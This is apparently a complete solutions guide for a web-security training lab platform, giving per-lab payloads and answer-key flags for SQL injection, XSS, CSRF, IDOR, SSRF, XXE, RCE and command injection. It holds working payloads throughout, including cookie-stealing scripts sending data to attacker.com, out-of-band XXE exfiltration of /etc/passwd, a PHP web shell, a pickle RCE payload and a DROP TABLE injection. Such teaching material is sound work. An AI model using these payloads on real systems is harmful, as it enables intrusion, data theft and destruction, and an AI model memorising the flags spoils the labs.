# OWASP Labs Platform - Complete Solutions Guide

This guide provides step-by-step solutions for all 160 labs in the OWASP platform.

---

## Table of Contents

1. [SQL Injection](#sql-injection)
2. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
3. [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
4. [Insecure Direct Object Reference (IDOR)](#insecure-direct-object-reference-idor)
5. [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
6. [XML External Entity (XXE)](#xml-external-entity-xxe)
7. [Remote Code Execution (RCE)](#remote-code-execution-rce)
8. [Command Injection](#command-injection)

---

## SQL Injection

### Introduction

SQL Injection is one of the most dangerous web vulnerabilities that allows an attacker to execute arbitrary SQL commands in the database.

### Lab 1.1: Login Bypass with UNION Attack

**Objective:** Bypass login form using UNION-based SQL injection.

**Solution Steps:**

1. Navigate to the login form
2. In the username field, enter this payload:
   ```sql
   ' UNION SELECT 1,'admin','password',4 --
   ```
3. Enter anything in the password field
4. The final query becomes:
   ```sql
   SELECT id, username, password, role FROM users
   WHERE username = '' UNION SELECT 1,'admin','password',4 --' AND password = '...'
   ```
5. Retrieve the flag: `FLAG{sqli_union_login_2024}`

**Key Concepts:**

- UNION allows combining results from two SELECT statements
- `--` comments out the rest of the query
- Number of columns must match between SELECT statements

---

### Lab 1.2: Data Extraction with UNION

**Objective:** Extract information from the users table.

**Solution Steps:**

1. Find the number of columns:
   ```sql
   ' UNION SELECT NULL,NULL,NULL,NULL --
   ```
2. Find table names:
   ```sql
   ' UNION SELECT 1,table_name,3,4 FROM information_schema.tables --
   ```
3. Find column names:
   ```sql
   ' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users' --
   ```
4. Extract data:
   ```sql
   ' UNION SELECT id,username,password,email FROM users --
   ```

**Flag:** `FLAG{sqli_data_extraction_2024}`

---

### Lab 1.3: Boolean-based Blind SQL Injection

**Objective:** Use Boolean-based Blind SQLi to extract data.

**Solution Steps:**

1. Test for vulnerability:
   ```sql
   ' AND '1'='1
   ' AND '1'='2
   ```
2. Find admin password length:
   ```sql
   ' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>10 --
   ```
3. Extract each character:
   ```sql
   ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --
   ```
4. Repeat this process until you extract the entire password

**Flag:** `FLAG{blind_sqli_boolean_2024}`

---

### Lab 1.4: Time-based Blind SQL Injection

**Objective:** Use time delays to extract information.

**Solution Steps:**

1. Test for vulnerability:
   ```sql
   ' AND SLEEP(5) --
   ```
2. Extract data conditionally:
   ```sql
   ' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0) --
   ```
3. If the response takes 5 seconds, the character is correct

**Flag:** `FLAG{time_based_sqli_2024}`

---

### Lab 1.5: Stacked Queries Injection

**Objective:** Execute multiple queries simultaneously.

**Solution Steps:**

1. Close the original query and add a new one:
   ```sql
   '; INSERT INTO users (username, password, role) VALUES ('hacker', 'pass123', 'admin'); --
   ```
2. Or for deletion:
   ```sql
   '; DROP TABLE logs; --
   ```
3. To create a new admin user:
   ```sql
   '; UPDATE users SET role='admin' WHERE username='youruser'; --
   ```

**Flag:** `FLAG{stacked_queries_2024}`

---

## Cross-Site Scripting (XSS)

### Introduction

XSS allows an attacker to inject malicious JavaScript code into web pages.

### Lab 2.1: Simple Reflected XSS

**Objective:** Execute a script in the search results page.

**Solution Steps:**

1. In the search field, enter this payload:
   ```html
   <script>
     alert("XSS");
   </script>
   ```
2. If an alert appears, the vulnerability exists
3. To retrieve the flag:
   ```html
   <script>
     fetch("/api/xss/flag")
       .then((r) => r.text())
       .then(alert);
   </script>
   ```

**Flag:** `FLAG{reflected_xss_basic_2024}`

---

### Lab 2.2: Stored XSS in Comments

**Objective:** Store a script in the database.

**Solution Steps:**

1. In the comments field, enter this payload:
   ```html
   <script>
     document.write(
       '<img src="http://attacker.com/?cookie=' + document.cookie + '">'
     );
   </script>
   ```
2. The script executes every time someone views the page
3. To steal cookies:
   ```html
   <script>
     new Image().src = "http://attacker.com/steal?c=" + document.cookie;
   </script>
   ```

**Flag:** `FLAG{stored_xss_comments_2024}`

---

### Lab 2.3: DOM-based XSS

**Objective:** Exploit client-side vulnerability.

**Solution Steps:**

1. Inspect the page's JavaScript code:
   ```javascript
   document.getElementById("output").innerHTML = location.hash.substring(1);
   ```
2. Modify the URL:
   ```
   http://example.com/page#<script>alert('XSS')</script>
   ```
3. Or to extract data:
   ```
   http://example.com/page#<img src=x onerror="fetch('/api/flag').then(r=>r.text()).then(alert)">
   ```

**Flag:** `FLAG{dom_xss_2024}`

---

### Lab 2.4: XSS Filter Bypass

**Objective:** Bypass XSS filters.

**Solution Steps:**

1. If `<script>` is filtered:
   ```html
   <img src=x onerror=alert('XSS')> <svg onload=alert('XSS')>
   ```
2. If `alert` is filtered:
   ```html
   <script>
     eval(
       String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41)
     );
   </script>
   ```
3. Using encoding:
   ```html
   <img
     src="x"
     onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"
   />
   ```

**Flag:** `FLAG{xss_filter_bypass_2024}`

---

### Lab 2.5: XSS in JSON Response

**Objective:** Inject script in JSON response.

**Solution Steps:**

1. If API response is:
   ```json
   { "username": "input" }
   ```
2. Send this payload:
   ```
   ","role":"admin"}<script>alert('XSS')</script>
   ```
3. Or with callback:
   ```
   ?callback=<script>alert('XSS')</script>
   ```

**Flag:** `FLAG{xss_json_response_2024}`

---

## Cross-Site Request Forgery (CSRF)

### Introduction

CSRF allows an attacker to send unauthorized requests on behalf of the victim.

### Lab 3.1: Simple CSRF

**Objective:** Change user password without authorization.

**Solution Steps:**

1. Create an HTML page:
   ```html
   <html>
     <body>
       <form
         action="http://vulnerable-site.com/api/user/change-password"
         method="POST"
         id="csrf"
       >
         <input type="hidden" name="new_password" value="hacked123" />
       </form>
       <script>
         document.getElementById("csrf").submit();
       </script>
     </body>
   </html>
   ```
2. Convince the victim to open this page
3. Password changes automatically

**Flag:** `FLAG{csrf_basic_attack_2024}`

---

### Lab 3.2: CSRF with GET Request

**Objective:** Use GET to modify data.

**Solution Steps:**

1. Create an img tag:
   ```html
   <img
     src="http://vulnerable-site.com/api/user/delete?id=123"
     style="display:none"
   />
   ```
2. Place this in an email or page
3. When the victim opens the page, the user is deleted

**Flag:** `FLAG{csrf_get_request_2024}`

---

### Lab 3.3: CSRF Token Bypass

**Objective:** Bypass CSRF token.

**Solution Steps:**

1. If token is in URL:
   ```javascript
   fetch("/api/get-token")
     .then((r) => r.json())
     .then((data) => {
       fetch("/api/action", {
         method: "POST",
         headers: { "X-CSRF-Token": data.token },
         body: JSON.stringify({ action: "delete" }),
       });
     });
   ```
2. Or steal token using XSS:
   ```html
   <script>
     var token = document.querySelector("[name=csrf_token]").value;
     fetch("/api/action", {
       method: "POST",
       headers: { "X-CSRF-Token": token },
       body: JSON.stringify({ action: "delete" }),
     });
   </script>
   ```

**Flag:** `FLAG{csrf_token_bypass_2024}`

---

## Insecure Direct Object Reference (IDOR)

### Introduction

IDOR occurs when an application allows users to directly access internal objects.

### Lab 4.1: IDOR in Profile

**Objective:** Access other users' profiles.

**Solution Steps:**

1. Navigate to your profile:
   ```
   http://site.com/api/user/profile?id=5
   ```
2. Change the ID:
   ```
   http://site.com/api/user/profile?id=1
   ```
3. View admin profile

**Flag:** `FLAG{idor_profile_access_2024}`

---

### Lab 4.2: IDOR in Files

**Objective:** Download private files from other users.

**Solution Steps:**

1. Download your file:
   ```
   http://site.com/api/download/file/123
   ```
2. Change the file ID:
   ```
   http://site.com/api/download/file/1
   http://site.com/api/download/file/2
   ```
3. Receive others' files

**Flag:** `FLAG{idor_file_download_2024}`

---

### Lab 4.3: IDOR with UUID

**Objective:** Guess weak UUIDs.

**Solution Steps:**

1. Check UUID format:
   ```
   /api/invoice/00000001-0000-0000-0000-000000000001
   ```
2. If sequential, try the next one:
   ```
   /api/invoice/00000001-0000-0000-0000-000000000002
   ```
3. Or brute force:
   ```python
   for i in range(1, 1000):
       uuid = f"00000001-0000-0000-0000-{i:012d}"
       response = requests.get(f'/api/invoice/{uuid}')
   ```

**Flag:** `FLAG{idor_uuid_prediction_2024}`

---

## Server-Side Request Forgery (SSRF)

### Introduction

SSRF allows an attacker to force the server to access internal or external resources.

### Lab 5.1: Simple SSRF

**Objective:** Access internal services.

**Solution Steps:**

1. In the URL field, enter:
   ```
   http://localhost:5000/api/admin
   ```
2. Or to read files:
   ```
   file:///etc/passwd
   ```
3. To access metadata:
   ```
   http://169.254.169.254/latest/meta-data/
   ```

**Flag:** `FLAG{ssrf_internal_access_2024}`

---

### Lab 5.2: SSRF with Redirect

**Objective:** Use redirect to bypass filters.

**Solution Steps:**

1. Set up a simple HTTP server:

   ```python
   from flask import Flask, redirect
   app = Flask(__name__)

   @app.route('/')
   def redir():
       return redirect('http://localhost:5000/admin')
   ```

2. Enter your server URL:
   ```
   http://your-server.com/
   ```

**Flag:** `FLAG{ssrf_redirect_bypass_2024}`

---

### Lab 5.3: SSRF with DNS Rebinding

**Objective:** Use DNS changes to bypass whitelist.

**Solution Steps:**

1. Get a domain you control DNS for
2. Initially redirect to allowed IP
3. Then change DNS to localhost
4. Request sent to internal server

**Flag:** `FLAG{ssrf_dns_rebinding_2024}`

---

## XML External Entity (XXE)

### Introduction

XXE allows an attacker to use XML parser to read system files.

### Lab 6.1: Simple XXE

**Objective:** Read /etc/passwd file.

**Solution Steps:**

1. Send this XML:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <data>&xxe;</data>
   ```
2. File contents displayed in response

**Flag:** `FLAG{xxe_file_read_2024}`

---

### Lab 6.2: Blind XXE with Out-of-Band

**Objective:** Send data to your server.

**Solution Steps:**

1. Send this XML:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [
   <!ENTITY % xxe SYSTEM "http://your-server.com/xxe.dtd">
   %xxe;
   ]>
   ```
2. xxe.dtd file:
   ```xml
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://your-server.com/?data=%file;'>">
   %eval;
   %exfil;
   ```

**Flag:** `FLAG{blind_xxe_oob_2024}`

---

## Remote Code Execution (RCE)

### Introduction

RCE is the most dangerous vulnerability allowing arbitrary code execution on the server.

### Lab 7.1: RCE in File Upload

**Objective:** Upload a PHP shell.

**Solution Steps:**

1. Create shell.php:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
2. Upload it
3. Access it:
   ```
   http://site.com/uploads/shell.php?cmd=ls
   ```

**Flag:** `FLAG{rce_file_upload_2024}`

---

### Lab 7.2: RCE in Deserialization

**Objective:** Use unsafe deserialization.

**Solution Steps:**

1. For Python:

   ```python
   import pickle
   import os

   class RCE:
       def __reduce__(self):
           return (os.system, ('whoami',))

   payload = pickle.dumps(RCE())
   ```

2. Send the payload

**Flag:** `FLAG{rce_deserialization_2024}`

---

## Command Injection

### Introduction

Command Injection allows an attacker to execute operating system commands.

### Lab 8.1: Simple Command Injection

**Objective:** Execute shell commands in input field.

**Solution Steps:**

1. In the ping field, enter:
   ```bash
   127.0.0.1; ls -la
   ```
2. Or with pipe:
   ```bash
   127.0.0.1 | cat /etc/passwd
   ```
3. Or with &&:
   ```bash
   127.0.0.1 && whoami
   ```

**Flag:** `FLAG{command_injection_basic_2024}`

---

### Lab 8.2: Command Injection with Filter Bypass

**Objective:** Bypass character filters.

**Solution Steps:**

1. If `;` is filtered, use `\n`:
   ```bash
   127.0.0.1%0Als
   ```
2. Or use variables:
   ```bash
   127.0.0.1${IFS}&&${IFS}cat${IFS}/etc/passwd
   ```
3. Or use wildcards:
   ```bash
   /bin/c?t /etc/p?sswd
   ```

**Flag:** `FLAG{command_injection_bypass_2024}`

---

## General Tips for All Labs

### Recommended Tools:

- **Burp Suite:** For intercepting and modifying requests
- **OWASP ZAP:** Free vulnerability scanner
- **SQLMap:** For automated SQL Injection
- **XSStrike:** For automated XSS
- **Postman:** For API testing

### Common Techniques:

1. Always examine input
2. Use browser developer tools
3. Intercept HTTP requests
4. Manipulate parameters
5. Analyze server responses

### Learning Resources:

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/

---

**Security Warning:** These techniques should only be used for educational purposes and in legal environments. Using these methods on real systems without permission is illegal.
